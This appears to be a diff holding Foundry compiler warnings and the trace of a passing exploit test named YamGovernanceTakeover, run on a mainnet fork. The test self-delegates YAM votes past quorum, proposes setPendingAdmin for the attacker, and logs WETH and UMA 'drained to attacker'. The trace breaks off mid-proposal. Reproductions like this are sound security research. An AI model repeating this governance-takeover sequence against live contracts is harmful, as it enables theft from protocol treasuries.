@@ -1,0 +1,771 @@
+Compiling 20 files with Solc 0.8.35
+Solc 0.8.35 finished in 557.37ms
+Compiler run successful with warnings:
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1241:9:
+     |
+1241 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1255:9:
+     |
+1255 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1263:79:
+     |
+1263 |     function assertApproxEqAbs(uint256 left, uint256 right, uint256 maxDelta, string calldata error) external pure;
+     |                                                                               ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1270:77:
+     |
+1270 |     function assertApproxEqAbs(int256 left, int256 right, uint256 maxDelta, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1287:9:
+     |
+1287 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1305:9:
+     |
+1305 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1315:86:
+     |
+1315 |     function assertApproxEqRel(uint256 left, uint256 right, uint256 maxPercentDelta, string calldata error)
+     |                                                                                      ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1326:84:
+     |
+1326 |     function assertApproxEqRel(int256 left, int256 right, uint256 maxPercentDelta, string calldata error)
+     |                                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1335:77:
+     |
+1335 |     function assertEqDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1342:75:
+     |
+1342 |     function assertEqDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1348:46:
+     |
+1348 |     function assertEq(bool left, bool right, string calldata error) external pure;
+     |                                              ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1354:68:
+     |
+1354 |     function assertEq(string calldata left, string calldata right, string calldata error) external pure;
+     |                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1360:66:
+     |
+1360 |     function assertEq(bytes calldata left, bytes calldata right, string calldata error) external pure;
+     |                                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1366:68:
+     |
+1366 |     function assertEq(bool[] calldata left, bool[] calldata right, string calldata error) external pure;
+     |                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1372:74:
+     |
+1372 |     function assertEq(uint256[] calldata left, uint256[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1378:72:
+     |
+1378 |     function assertEq(int256[] calldata left, int256[] calldata right, string calldata error) external pure;
+     |                                                                        ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1387:74:
+     |
+1387 |     function assertEq(address[] calldata left, address[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1393:74:
+     |
+1393 |     function assertEq(bytes32[] calldata left, bytes32[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1399:72:
+     |
+1399 |     function assertEq(string[] calldata left, string[] calldata right, string calldata error) external pure;
+     |                                                                        ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1405:70:
+     |
+1405 |     function assertEq(bytes[] calldata left, bytes[] calldata right, string calldata error) external pure;
+     |                                                                      ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1408:52:
+     |
+1408 |     function assertEq(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1414:50:
+     |
+1414 |     function assertEq(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1420:52:
+     |
+1420 |     function assertEq(address left, address right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1426:52:
+     |
+1426 |     function assertEq(bytes32 left, bytes32 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1432:42:
+     |
+1432 |     function assertFalse(bool condition, string calldata error) external pure;
+     |                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1440:77:
+     |
+1440 |     function assertGeDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1448:75:
+     |
+1448 |     function assertGeDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1455:52:
+     |
+1455 |     function assertGe(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1462:50:
+     |
+1462 |     function assertGe(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1470:77:
+     |
+1470 |     function assertGtDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1478:75:
+     |
+1478 |     function assertGtDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1485:52:
+     |
+1485 |     function assertGt(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1492:50:
+     |
+1492 |     function assertGt(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1500:77:
+     |
+1500 |     function assertLeDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1508:75:
+     |
+1508 |     function assertLeDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1515:52:
+     |
+1515 |     function assertLe(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1522:50:
+     |
+1522 |     function assertLe(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1530:77:
+     |
+1530 |     function assertLtDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1538:75:
+     |
+1538 |     function assertLtDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1545:52:
+     |
+1545 |     function assertLt(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1552:50:
+     |
+1552 |     function assertLt(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1559:80:
+     |
+1559 |     function assertNotEqDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                                ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1566:78:
+     |
+1566 |     function assertNotEqDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                              ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1572:49:
+     |
+1572 |     function assertNotEq(bool left, bool right, string calldata error) external pure;
+     |                                                 ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1578:71:
+     |
+1578 |     function assertNotEq(string calldata left, string calldata right, string calldata error) external pure;
+     |                                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1584:69:
+     |
+1584 |     function assertNotEq(bytes calldata left, bytes calldata right, string calldata error) external pure;
+     |                                                                     ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1590:71:
+     |
+1590 |     function assertNotEq(bool[] calldata left, bool[] calldata right, string calldata error) external pure;
+     |                                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1596:77:
+     |
+1596 |     function assertNotEq(uint256[] calldata left, uint256[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1602:75:
+     |
+1602 |     function assertNotEq(int256[] calldata left, int256[] calldata right, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1611:77:
+     |
+1611 |     function assertNotEq(address[] calldata left, address[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1617:77:
+     |
+1617 |     function assertNotEq(bytes32[] calldata left, bytes32[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1623:75:
+     |
+1623 |     function assertNotEq(string[] calldata left, string[] calldata right, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1629:73:
+     |
+1629 |     function assertNotEq(bytes[] calldata left, bytes[] calldata right, string calldata error) external pure;
+     |                                                                         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1632:55:
+     |
+1632 |     function assertNotEq(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1638:53:
+     |
+1638 |     function assertNotEq(int256 left, int256 right, string calldata error) external pure;
+     |                                                     ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1644:55:
+     |
+1644 |     function assertNotEq(address left, address right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1650:55:
+     |
+1650 |     function assertNotEq(bytes32 left, bytes32 right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1656:41:
+     |
+1656 |     function assertTrue(bool condition, string calldata error) external pure;
+     |                                         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (4591): There are more than 256 warnings. Ignoring the rest.
+
+Ran 1 test for test/YamFinance_exp.sol:YamFinanceExploit
+[PASS] test_YamGovernanceTakeover() (gas: 1274587)
+Logs:
+  attacker YAM stake (purchased, at risk): 504427.049076663433225108
+  attacker vote weight (underlying denom): 201664062636824099514174674941
+  quorumVotes(): 200000000000000000000000000000
+  proposalThreshold(): 50000000000000000000000000000
+  proposalId: 45
+  WETH drained from MAR: 23.499119440368500920
+  UMA  drained from MAR: 763.101265318097645247
+  WETH drained from FEB: 24.586255602921865850
+  TOTAL WETH drained to attacker: 48.085375043290366770
+  TOTAL UMA  drained to attacker: 763.101265318097645247
+
+Traces:
+  [3644] YamFinanceExploit::setUp()
+    ├─ [0] VM::createSelectFork("<rpc url>", 25884984 [2.588e7])
+    │   └─ ← [Return] 1
+    └─ ← [Stop]
+
+  [1488887] YamFinanceExploit::test_YamGovernanceTakeover()
+    ├─ [10080] 0x0AaCfbeC6a24756c20D41914F2caba817C0d8521::delegates(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982) [staticcall]
+    │   ├─ [8680] 0x0AaCfbeC6a24756c20D41914F2caba817C0d8521::delegateToImplementation(0x587cde1e00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982) [staticcall]
+    │   │   ├─ [2539] 0x27C5736b49B89d4765d03734a0a51c461F09672d::delegates(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982) [delegatecall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    ├─ [0] VM::assertEq(0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, "attacker should not be delegated yet at fork") [staticcall]
+    │   └─ ← [Return]
+    ├─ [2401] 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5::admin() [staticcall]
+    │   └─ ← [Return] YamGovernorAlpha: [0x2DA253835967D6E721C6c077157F9c9742934aeA]
+    ├─ [0] VM::assertEq(YamGovernorAlpha: [0x2DA253835967D6E721C6c077157F9c9742934aeA], YamGovernorAlpha: [0x2DA253835967D6E721C6c077157F9c9742934aeA], "governor should be the timelock admin at fork") [staticcall]
+    │   └─ ← [Return]
+    ├─ [2387] 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5::delay() [staticcall]
+    │   └─ ← [Return] 432000 [4.32e5]
+    ├─ [0] VM::assertEq(432000 [4.32e5], 432000 [4.32e5], "timelock delay should be 5 days at fork") [staticcall]
+    │   └─ ← [Return]
+    ├─ [2453] 0xffb607418dBEaB7A888e079A34Be28A30d8E1DE2::gov() [staticcall]
+    │   └─ ← [Return] 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5
+    ├─ [0] VM::assertEq(0x8b4f1616751117C38a0f84F9A146cca191ea3EC5, 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5, "MAR gov should be the timelock") [staticcall]
+    │   └─ ← [Return]
+    ├─ [2453] 0xc0AE1e1e172ECD4C56fD8043FD5Afe5a473E9835::gov() [staticcall]
+    │   └─ ← [Return] 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5
+    ├─ [0] VM::assertEq(0x8b4f1616751117C38a0f84F9A146cca191ea3EC5, 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5, "FEB gov should be the timelock") [staticcall]
+    │   └─ ← [Return]
+    ├─ [8047] 0x0AaCfbeC6a24756c20D41914F2caba817C0d8521::balanceOf(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982) [staticcall]
+    │   ├─ [6646] 0x0AaCfbeC6a24756c20D41914F2caba817C0d8521::delegateToImplementation(0x70a0823100000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982) [staticcall]
+    │   │   ├─ [5005] 0x27C5736b49B89d4765d03734a0a51c461F09672d::balanceOf(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982) [delegatecall]
+    │   │   │   └─ ← [Return] 504427049076663433225108 [5.044e23]
+    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000006ad10b8d362da17ee394
+    │   └─ ← [Return] 504427049076663433225108 [5.044e23]
+    ├─ emit log_named_decimal_uint(key: "attacker YAM stake (purchased, at risk)", val: 504427049076663433225108 [5.044e23], decimals: 18)
+    ├─ [0] VM::startPrank(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982)
+    │   └─ ← [Return]
+    ├─ [92609] 0x0AaCfbeC6a24756c20D41914F2caba817C0d8521::delegate(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982)
+    │   ├─ [91890] 0x27C5736b49B89d4765d03734a0a51c461F09672d::delegate(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982) [delegatecall]
+    │   │   ├─ emit DelegateChanged(delegator: 0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982, fromDelegate: 0x0000000000000000000000000000000000000000, toDelegate: 0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982)
+    │   │   ├─ emit DelegateVotesChanged(delegate: 0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982, previousBalance: 0, newBalance: 201664062636824099514174674941 [2.016e29])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x9ed675f70ad25a9d2e0a9a6ed7c46356ab18c8a7eb2b37c3b5399422701a50ae: 0 → 0x00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982
+    │   │   │   @ 0xec0b82ba307270da9ef65c965d2055267914df7255ec65eaabae386bab27607b: 0 → 0x00000000000000000000000000000000000000028b9c9a5527a5fe8fd92417fd
+    │   │   │   @ 0xec0b82ba307270da9ef65c965d2055267914df7255ec65eaabae386bab27607a: 0 → 0x00000000000000000000000000000000000000000000000000000000018af938
+    │   │   │   @ 0xd7daa4f61b29f7d8dbbfee4b909fbb8b1f3aca3bb48712bf4958d5e32ebb21f7: 0 → 1
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [3580] 0x0AaCfbeC6a24756c20D41914F2caba817C0d8521::delegates(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982) [staticcall]
+    │   ├─ [2180] 0x0AaCfbeC6a24756c20D41914F2caba817C0d8521::delegateToImplementation(0x587cde1e00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982) [staticcall]
+    │   │   ├─ [539] 0x27C5736b49B89d4765d03734a0a51c461F09672d::delegates(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982) [delegatecall]
+    │   │   │   └─ ← [Return] 0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002000000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982
+    │   └─ ← [Return] 0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982
+    ├─ [0] VM::assertEq(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982, 0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982, "self-delegation failed") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::roll(25884986 [2.588e7])
+    │   └─ ← [Return]
+    ├─ [3913] 0x0AaCfbeC6a24756c20D41914F2caba817C0d8521::getCurrentVotes(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982) [staticcall]
+    │   ├─ [2468] 0x0AaCfbeC6a24756c20D41914F2caba817C0d8521::delegateToImplementation(0xb4b5ea5700000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982) [staticcall]
+    │   │   ├─ [827] 0x27C5736b49B89d4765d03734a0a51c461F09672d::getCurrentVotes(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982) [delegatecall]
+    │   │   │   └─ ← [Return] 201664062636824099514174674941 [2.016e29]
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000028b9c9a5527a5fe8fd92417fd
+    │   └─ ← [Return] 201664062636824099514174674941 [2.016e29]
+    ├─ emit log_named_uint(key: "attacker vote weight (underlying denom)", val: 201664062636824099514174674941 [2.016e29])
+    ├─ [367] YamGovernorAlpha::quorumVotes() [staticcall]
+    │   └─ ← [Return] 200000000000000000000000000000 [2e29]
+    ├─ emit log_named_uint(key: "quorumVotes()", val: 200000000000000000000000000000 [2e29])
+    ├─ [388] YamGovernorAlpha::proposalThreshold() [staticcall]
+    │   └─ ← [Return] 50000000000000000000000000000 [5e28]
+    ├─ emit log_named_uint(key: "proposalThreshold()", val: 50000000000000000000000000000 [5e28])
+    ├─ [388] YamGovernorAlpha::proposalThreshold() [staticcall]
+    │   └─ ← [Return] 50000000000000000000000000000 [5e28]
+    ├─ [0] VM::assertGt(201664062636824099514174674941 [2.016e29], 50000000000000000000000000000 [5e28], "stake below proposal threshold") [staticcall]
+    │   └─ ← [Return]
+    ├─ [367] YamGovernorAlpha::quorumVotes() [staticcall]
+    │   └─ ← [Return] 200000000000000000000000000000 [2e29]
+    ├─ [0] VM::assertGt(201664062636824099514174674941 [2.016e29], 200000000000000000000000000000 [2e29], "stake below quorum - self-weight alone must clear it") [staticcall]
+    │   └─ ← [Return]
+    ├─ [359843] YamGovernorAlpha::propose([0x8b4f1616751117C38a0f84F9A146cca191ea3EC5], [0], ["setPendingAdmin(address)"], [0x00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982], "0x")
+    │   ├─ [4503] 0x0AaCfbeC6a24756c20D41914F2caba817C0d8521::getPriorVotes(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982, 25884985 [2.588e7]) [staticcall]
+    │   │   ├─ [2958] 0x0AaCfbeC6a24756c20D41914F2caba817C0d8521::delegateToImplementation(0x782d6fe100000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf98200000000000000000000000000000000000000000000000000000000018af939) [staticcall]
+    │   │   │   ├─ [1232] 0x27C5736b49B89d4765d03734a0a51c461F09672d::getPriorVotes(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982, 25884985 [2.588e7]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 201664062636824099514174674941 [2.016e29]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000028b9c9a5527a5fe8fd92417fd
+    │   │   └─ ← [Return] 201664062636824099514174674941 [2.016e29]
+    │   ├─ [22168] 0xD67c05523D8ec1c60760Fd017Ef006b9F6e496D0::getPriorVotes(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982, 25884985 [2.588e7]) [staticcall]
+    │   │   ├─ [10503] 0x0AaCfbeC6a24756c20D41914F2caba817C0d8521::getPriorVotes(0x0F82E57804D0B1F6FAb2370A43dcFAd3c7cB239c, 25884985 [2.588e7]) [staticcall]
+    │   │   │   ├─ [8958] 0x0AaCfbeC6a24756c20D41914F2caba817C0d8521::delegateToImplementation(0x782d6fe10000000000000000000000000f82e57804d0b1f6fab2370a43dcfad3c7cb239c00000000000000000000000000000000000000000000000000000000018af939) [staticcall]
+    │   │   │   │   ├─ [7232] 0x27C5736b49B89d4765d03734a0a51c461F09672d::getPriorVotes(0x0F82E57804D0B1F6FAb2370A43dcFAd3c7cB239c, 25884985 [2.588e7]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 53693851944687816149472025684 [5.369e28]
+    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000ad7e836a60954841f7ae9c54
+    │   │   │   └─ ← [Return] 53693851944687816149472025684 [5.369e28]
+    │   │   └─ ← [Return] 0
+    │   ├─ emit ProposalCreated(id: 45, proposer: 0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982, targets: [0x8b4f1616751117C38a0f84F9A146cca191ea3EC5], values: [0], signatures: ["setPendingAdmin(address)"], calldatas: [0x00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982], startBlock: 25884987 [2.588e7], endBlock: 25897332 [2.589e7], description: "0x")
+    │   ├─  storage changes:
+    │   │   @ 0x37a4a8ad607c0cc7f2e727269e7e8683cc6e8938b22c73e7ea61092d160b1bff: 0 → 0x73657450656e64696e6741646d696e2861646472657373290000000000000030
+    │   │   @ 0x17fa89f89bfc2b10b7f27cfbad995cfe7e14bb8f6b784c62be170579c47a2f85: 0 → 45
+    │   │   @ 0x2eb64dace9e373e1977085b49848a1e4396fe576dfe9452fe2fa0c3fe5f8fba5: 0 → 1
+    │   │   @ 0x2eb64dace9e373e1977085b49848a1e4396fe576dfe9452fe2fa0c3fe5f8fba1: 0 → 0x00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982
+    │   │   @ 0xbff7c74235d23c87940d65ab6ab82788ddfc40862c758d4de313e06caa03389c: 0 → 0x0000000000000000000000008b4f1616751117c38a0f84f9a146cca191ea3ec5
